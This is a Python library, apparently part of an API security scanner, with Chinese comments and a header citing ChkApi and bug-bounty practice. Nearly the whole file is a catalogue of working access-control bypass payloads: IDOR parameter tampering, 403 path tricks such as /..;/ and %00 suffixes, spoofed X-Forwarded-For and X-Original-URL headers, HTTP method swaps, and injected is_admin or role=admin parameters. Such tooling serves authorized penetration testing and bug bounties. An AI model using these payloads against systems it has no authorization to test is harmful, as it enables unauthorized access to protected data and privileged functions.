"""
Bypass Techniques Library
Bypass 技术库 - 绕过 API 安全限制
参考 0x727/ChkApi bypass 技术
以及 Bugcrowd/HackerOne 众测技巧
"""

import random
import string
import re
import json
from typing import Dict, List, Any, Callable, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import quote


def encode_param_list(key: str, values: List[Any], style: str = 'bracket') -> List[Tuple[str, str]]:
    """
    编码列表参数，支持多种格式
    
    Args:
        key: 参数名
        values: 参数值列表
        style: 编码风格
            - 'bracket': key[]=value (PHP 风格)
            - 'indexed': key[0]=value&key[1]=value
            - 'plain': key=value1&key=value2
    
    Returns:
        [(key, value), ...] 格式的列表
    """
    result = []
    if style == 'bracket':
        for v in values:
            result.append((f"{key}[]", str(v)))
    elif style == 'indexed':
        for i, v in enumerate(values):
            result.append((f"{key}[{i}]", str(v)))
    else:
        for v in values:
            result.append((key, str(v)))
    return result


def encode_params_with_arrays(params: Dict[str, Any]) -> str:
    """
    编码参数字典，支持列表格式
    
    正确的格式：
    - 普通参数: key1=value1
    - 数组参数: key[]=value (PHP 风格)
    - 重复参数: key=value1&key=value2
    """
    pairs = []
    for key, value in params.items():
        if isinstance(value, list):
            pairs.extend(encode_param_list(key, value, 'bracket'))
        elif isinstance(value, str) and value.startswith('[[BYPASS_ARRAY]]'):
            actual_value = value.replace('[[BYPASS_ARRAY]]', '')
            pairs.append((f"{key}[]", actual_value))
        elif isinstance(value, str) and '&' in value and '=' in value:
            pairs.append((key, value))
        else:
            pairs.append((key, str(value)))
    return '&'.join(f"{quote(k, safe='')}={quote(str(v), safe='')}" for k, v in pairs)


@dataclass
class BypassTechnique:
    """Bypass 技术"""
    name: str
    description: str
    bypass_type: str  # status, header, path, parameter, idor, method, body
    apply_func: Callable
    expected_status: int = 200
    category: str = "general"  # general, idor, 403, 401


class BypassTechniques:
    """
    Bypass 技术集合
    
    支持的 Bypass 类型：
    1. 状态码 Bypass (301/302/401/404)
    2. Header Bypass
    3. 路径 Bypass
    4. 参数 Bypass
    """
    
    @staticmethod
    def get_random_ip() -> str:
        """生成随机 IP"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    @staticmethod
    def get_random_user_agent() -> str:
        """生成随机 User-Agent"""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        ]
        return random.choice(agents)
    
    @staticmethod
    def get_trusted_ips() -> List[str]:
        """获取可信内网 IP 列表"""
        return [
            '127.0.0.1',
            'localhost',
            '10.0.0.1',
            '10.0.0.0',
            '10.255.255.255',
            '172.16.0.0',
            '172.16.255.255',
            '192.168.0.0',
            '192.168.255.255',
            '169.254.0.0',
            '0.0.0.0',
        ]
    
    @staticmethod
    def get_all_techniques() -> List[BypassTechnique]:
        """获取所有 Bypass 技术"""
        return [
            # ========== IDOR Parameter Manipulation ==========
            BypassTechnique(
                name="IDOR - Array Wrap",
                description="参数数组包装绕过 IDOR (ASP.NET MVC)",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {k: f"[[BYPASS_ARRAY]]{v}" for k, v in original.get('params', {}).items()}
                },
                category="idor"
            ),
            BypassTechnique(
                name="IDOR - PHP Array Syntax",
                description="PHP 数组语法绕过 user[]=value",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {f"{k}[]": v for k, v in original.get('params', {}).items()}
                },
                category="idor"
            ),
            BypassTechnique(
                name="IDOR - Bracket Notation",
                description="方括号数组记号绕过",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {f"{k}[0]": v for k, v in original.get('params', {}).items()}
                },
                category="idor"
            ),
            BypassTechnique(
                name="IDOR - JSON Nesting",
                description="JSON 嵌套混淆绕过",
                bypass_type="body",
                apply_func=lambda original: {
                    'data': json.dumps({k: {"value": v} for k, v in original.get('params', {}).items()}) if original.get('params') else '{"value":1}',
                    'headers': {'Content-Type': 'application/json'}
                },
                category="idor"
            ),
            BypassTechnique(
                name="IDOR - JSON Wrapper",
                description="JSON 包装绕过",
                bypass_type="body",
                apply_func=lambda original: {
                    'data': json.dumps({"data": original.get('params', {})}) if original.get('params') else '{"data":{}}',
                    'headers': {'Content-Type': 'application/json'}
                },
                category="idor"
            ),
            BypassTechnique(
                name="IDOR - Type Confusion",
                description="参数类型混淆 (id=1 → id=abc)",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {k: 'abc' if k.lower() in ['id', 'user_id', 'uid'] else v for k, v in original.get('params', {}).items()}
                },
                category="idor"
            ),
            BypassTechnique(
                name="IDOR - Null Value",
                description="参数设为空值绕过",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {k: '' for k in original.get('params', {}).keys()}
                },
                category="idor"
            ),
            BypassTechnique(
                name="IDOR - Double Value",
                description="参数值双重传递",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {k: [v, v] for k, v in original.get('params', {}).items()}
                },
                category="idor"
            ),
            BypassTechnique(
                name="IDOR - Param Pollution",
                description="参数污染 (同一参数多个值)",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {k: [v, v] for k, v in original.get('params', {}).items()}
                },
                category="idor"
            ),

            # ========== 403/401 Path Bypass ==========
            BypassTechnique(
                name="403 - Add /..;/ to path",
                description="路径遍历绕过 403",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '') + '/..;/'
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Double URL Encode",
                description="双 URL 编码绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/', '%2F')
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add /./ to path",
                description="添加 /./ 绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/api/', '/api/./')
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Remove /v1/ prefix",
                description="移除版本前缀",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/v1/', '/')
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add /v2/ prefix",
                description="尝试 v2 版本",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/api/', '/api/v2/')
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add .json to path",
                description="添加文件后缀绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').rstrip('/') + '.json'
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add .xml to path",
                description="添加 .xml 后缀绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').rstrip('/') + '.xml'
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add ; to path",
                description="分号绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').rstrip('/') + ';'
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add %20 to path",
                description="空格 URL 编码绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/', '/%20/')
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Path case manipulation",
                description="路径大小写变换 (admin → ADMIN)",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('admin', 'ADMIN')
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add .yaml to path",
                description="添加 .yaml 后缀绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').rstrip('/') + '.yaml'
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add .txt to path",
                description="添加 .txt 后缀绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').rstrip('/') + '.txt'
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add .jsp to path",
                description="添加 .jsp 后缀绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').rstrip('/') + '.jsp'
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add %00.json to path",
                description="空字节截断 + JSON 后缀绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').rstrip('/') + '%00.json'
                },
                category="403"
            ),
            BypassTechnique(
                name="403 - Add trailing / to path",
                description="添加尾部斜杠绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').rstrip('/') + '/'
                },
                category="403"
            ),

            # ========== Header Bypass ==========
            BypassTechnique(
                name="Header - X-Forwarded-For IP",
                description="使用 X-Forwarded-For 头绕过 IP 限制",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Forwarded-For': BypassTechniques.get_random_ip()}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - X-Real-IP",
                description="使用 X-Real-IP 头绕过",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Real-IP': BypassTechniques.get_random_ip()}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - X-Real-IP Localhost",
                description="X-Real-IP 头使用 localhost",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Real-IP': '127.0.0.1'}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - X-Forwarded-For Localhost",
                description="X-Forwarded-For 头使用 127.0.0.1",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Forwarded-For': '127.0.0.1'}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - X-Forwarded-For 10.0.0.1",
                description="X-Forwarded-For 头使用内网 IP",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Forwarded-For': '10.0.0.1'}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - Client-IP Localhost",
                description="Client-IP 头使用 localhost",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'Client-IP': '127.0.0.1'}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - X-Originating-IP",
                description="使用 X-Originating-IP 头",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Originating-IP': BypassTechniques.get_random_ip()}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - CF-Connecting-IP",
                description="Cloudflare Connecting-IP 头",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'CF-Connecting-IP': BypassTechniques.get_random_ip()}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - X-Forwarded-Host",
                description="X-Forwarded-Host 头绕过",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Forwarded-Host': original.get('url', 'localhost')}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - X-Host",
                description="X-Host 头绕过",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Host': 'localhost'}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - X-Original-URL",
                description="X-Original-URL 覆盖路径 (Apache)",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Original-URL': original.get('path', '/admin')}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - X-Rewrite-URL",
                description="X-Rewrite-URL 重写路径 (ISAPI)",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Rewrite-URL': original.get('path', '/admin')}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - User-Agent Googlebot",
                description="伪装成 Googlebot",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - Referer Spoofing",
                description="伪造 Referer 头",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'Referer': original.get('url', 'https://google.com')}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - Requested-With XMLHttpRequest",
                description="添加 XMLHttpRequest 头绕过 CORS",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Requested-With': 'XMLHttpRequest'}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - Authorization Bearer",
                description="添加空的 Authorization 头",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'Authorization': 'Bearer '}
                },
                category="401"
            ),
            BypassTechnique(
                name="Header - Content-Type JSON",
                description="强制 JSON Content-Type",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'Content-Type': 'application/json'}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - Front-End-Https",
                description="Front-End-Https 头",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'Front-End-Https': 'on'}
                },
                category="403"
            ),
            BypassTechnique(
                name="Header - X-HTTP-Method-Override",
                description="方法覆盖头",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-HTTP-Method-Override': 'GET'}
                },
                category="403"
            ),

            # ========== HTTP Method Bypass ==========
            BypassTechnique(
                name="Method - POST to GET",
                description="POST 改为 GET",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'GET'
                },
                category="403"
            ),
            BypassTechnique(
                name="Method - GET to POST",
                description="GET 改为 POST",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'POST'
                },
                category="403"
            ),
            BypassTechnique(
                name="Method - CHANGE to PUT",
                description="使用 PUT 方法",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'PUT'
                },
                category="403"
            ),
            BypassTechnique(
                name="Method - CHANGE to PATCH",
                description="使用 PATCH 方法",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'PATCH'
                },
                category="403"
            ),
            BypassTechnique(
                name="Method - CHANGE to DELETE",
                description="使用 DELETE 方法",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'DELETE'
                },
                category="403"
            ),
            BypassTechnique(
                name="Method - HEAD",
                description="使用 HEAD 方法",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'HEAD'
                },
                category="403"
            ),
            BypassTechnique(
                name="Method - OPTIONS",
                description="使用 OPTIONS 方法探测",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'OPTIONS'
                },
                category="403"
            ),

            # ========== Body/Parameter Bypass ==========
            BypassTechnique(
                name="Body - Add null byte",
                description="参数添加空字节",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {k: v + '\x00' for k, v in original.get('params', {}).items()}
                },
                category="idor"
            ),
            BypassTechnique(
                name="Body - JSON to Form",
                description="JSON 转为表单格式",
                bypass_type="body",
                apply_func=lambda original: {
                    'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                    'data': original.get('data', '')
                },
                category="403"
            ),
            BypassTechnique(
                name="Body - Send empty body",
                description="发送空请求体",
                bypass_type="body",
                apply_func=lambda original: {
                    'data': ''
                },
                category="403"
            ),
            BypassTechnique(
                name="Body - _method parameter",
                description="添加 _method 参数（Ruby on Rails）",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {
                        **original.get('params', {}),
                        '_method': 'POST'
                    }
                },
                category="403"
            ),
            BypassTechnique(
                name="Parameter - Add admin parameters",
                description="添加管理员参数",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {
                        **original.get('params', {}),
                        'admin': 'true',
                        'role': 'admin',
                        'user_type': 'administrator'
                    }
                },
                category="idor"
            ),
            BypassTechnique(
                name="Parameter - is_admin=1",
                description="添加 is_admin 参数",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {
                        **original.get('params', {}),
                        'is_admin': '1'
                    }
                },
                category="idor"
            ),
            BypassTechnique(
                name="Parameter - access_level=admin",
                description="添加 access_level 参数",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {
                        **original.get('params', {}),
                        'access_level': 'admin'
                    }
                },
                category="idor"
            ),
            BypassTechnique(
                name="Parameter - role_id manipulation",
                description="role_id 参数操作",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {
                        **original.get('params', {}),
                        'role_id': '1',
                        'role': 'admin'
                    }
                },
                category="idor"
            ),

            # ========== 老旧 API 版本测试 ==========
            BypassTechnique(
                name="Version - Test /v1/ endpoint",
                description="测试 v1 版本 API",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/v2/', '/v1/').replace('/v3/', '/v1/')
                },
                category="403"
            ),
            BypassTechnique(
                name="Version - Test /v3/ endpoint",
                description="测试 v3 版本 API",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/v1/', '/v3/').replace('/v2/', '/v3/')
                },
                category="403"
            ),
            BypassTechnique(
                name="Version - Test /api/ without version",
                description="测试无版本前缀 API",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': re.sub(r'/v\d+/', '/', original.get('path', ''))
                },
                category="403"
            ),
            BypassTechnique(
                name="Version - Test /old/ endpoint",
                description="测试 /old/ 路径",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/api/', '/old/api/')
                },
                category="403"
            ),
            BypassTechnique(
                name="Version - Test /deprecated/ endpoint",
                description="测试 /deprecated/ 路径",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/api/', '/deprecated/api/')
                },
                category="403"
            ),
        ]
    
    @staticmethod
    def get_by_type(bypass_type: str) -> List[BypassTechnique]:
        """按类型获取 Bypass 技术"""
        return [t for t in BypassTechniques.get_all_techniques() if t.bypass_type == bypass_type]
    
    @staticmethod
    def get_header_bypass() -> List[BypassTechnique]:
        """获取 Header Bypass 技术"""
        return BypassTechniques.get_by_type("header")
    
    @staticmethod
    def get_path_bypass() -> List[BypassTechnique]:
        """获取 Path Bypass 技术"""
        return BypassTechniques.get_by_type("path")
    
    @staticmethod
    def get_parameter_bypass() -> List[BypassTechnique]:
        """获取 Parameter Bypass 技术"""
        return BypassTechniques.get_by_type("parameter")
    
    @staticmethod
    def get_method_bypass() -> List[BypassTechnique]:
        """获取 Method Bypass 技术"""
        return BypassTechniques.get_by_type("method")


def get_all_bypass_techniques() -> List[BypassTechnique]:
    """获取所有 Bypass 技术"""
    return BypassTechniques.get_all_techniques()


def get_bypass_technique(name: str) -> Optional[BypassTechnique]:
    """根据名称获取 Bypass 技术"""
    for technique in BypassTechniques.get_all_techniques():
        if technique.name == name:
            return technique
    return None
